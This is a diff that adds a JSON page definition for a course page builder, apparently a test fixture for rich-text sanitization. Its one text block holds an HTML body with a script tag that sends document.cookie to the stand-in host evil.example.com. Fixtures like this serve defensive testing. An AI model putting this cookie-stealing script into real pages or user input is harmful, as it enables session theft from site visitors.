@@ -1,0 +1,27 @@
+{
+  "schemaVersion": 1,
+  "kind": "ocs-ui-page",
+  "page": { "title": "Rich text with a script", "description": "", "byline": "", "course": "csp", "width": "contained", "image": "" },
+  "sections": [
+    {
+      "id": "s-script01",
+      "type": "stack",
+      "settings": {},
+      "hidden": false,
+      "cells": [
+        {
+          "blocks": [
+            {
+              "id": "b-script01",
+              "type": "text",
+              "settings": {
+                "body": "<b>Hello</b><script>fetch('https://evil.example.com/?c=' + document.cookie)</script>"
+              },
+              "hidden": false
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
